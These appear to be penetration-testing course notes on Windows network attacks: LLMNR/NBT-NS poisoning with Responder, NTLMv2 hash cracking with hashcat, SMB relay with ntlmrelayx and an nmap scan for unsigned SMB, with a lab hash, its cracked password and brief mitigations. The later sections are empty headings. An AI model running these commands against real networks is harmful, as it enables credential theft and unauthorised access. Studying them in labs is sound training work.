# Initial Attack Vectors

## Introduction

{% embed url="https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa" %}

## LLMNR Poisoning Overview

### What is LLMNR?

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification.

* Used to identify hosts when DNS fails to do so.
* Previously NBT-NS
* Key flaw is that the services utilizes a user's username and NTLMv2 hash when appropriately responded to.

### Steps

1. Run Responder
   1. `python3 /usr/share/responder/Responder.py -I tun0 -rdw -v`
2. An Even Occurs
   1. i.e. someone typed in the wrong network drive (DNS failing)
3. Get the Hashes
   1. Copy from Responder output and place in a text file
4. Crack the Hashes
   1. `hashcat -m 5600 hashes.txt rockyou.txt`

## Capturing NTLMv2 Hashes with Responder

### Example

#### From Kali

```bash
kali@kali:~/ctf/tcm/peh$ sudo responder -I eth0 -rdw
...
[+] Listening for events...
```

#### From Windows Machine (MARVEL\fcastle)

Opened file Explorer, and type \\\192.168.1.165 (The Kali IP address on eth0).

#### From Kali Machine

Responder grabs the hash from the previous event.

```bash
[SMB] NTLMv2-SSP Client   : 192.168.1.157
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:8ab5671e342774e7:B66F027CB5E16825C8967D591C85FA76:0101000000000000C0653150DE09D2012F006B8AD271B58B000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000031452132010184239D06D2B1049A174FC1A65A7E3EDCB6CD78A3CA55D16431910A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E0031002E003100360035000000000000000000                                                              
[*] Skipping previously captured hash for MARVEL\fcastle
```

## Password Cracking with Hashcat

### Example

From the hash found in the previous section an attempt to crack it

```bash
kali@kali:~/ctf/tcm/peh$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
...
<HASH>:Password1
```

## LLMNR Poisoning Defense

### Mitigation

The best defense in this case is to disable LLMNR and NBT-NS.

* To disable LLMNR,...
* To disable NBT-NS,...

If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:

* Require Network Access Control.
* Require strong user passwords. The more complex and long the password, the harder it is for an attacker to crack the hash.

## SMB Relay Attacks Overview

### What is SMB Relay?

Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access.

#### Requirements

* SMB signing must be disabled on the target
* Relayed user credentials must be admin on machine.

### Example

1. Run Responder
   1. vim /usr/share/responder/Responder.conf --> Turn Off SMB and HTTP
2. Run Responder
   1. `kali@kali:~/ctf/tcm/peh$ sudo responder -I eth0 -rdw`
3. Set up your relay
   1. `python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support`
4. An even occurs
   1. i.e. someone typed in the wrong network drive (DNS failing)
5. Get the hashes

## Discovering Hosts with SMB Signing Disabled

### Example

#### From Kali

```bash
kali@kali:~/ctf/tcm/peh$ sudo nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
...
Host scipr results:
| smb2-security-mode:
|   2.02:
|     Message signing enabled but not required
```

## SMB Relay Attack Demonstration

## SMB Relay Attack Defenses

## Gaining Shell Access
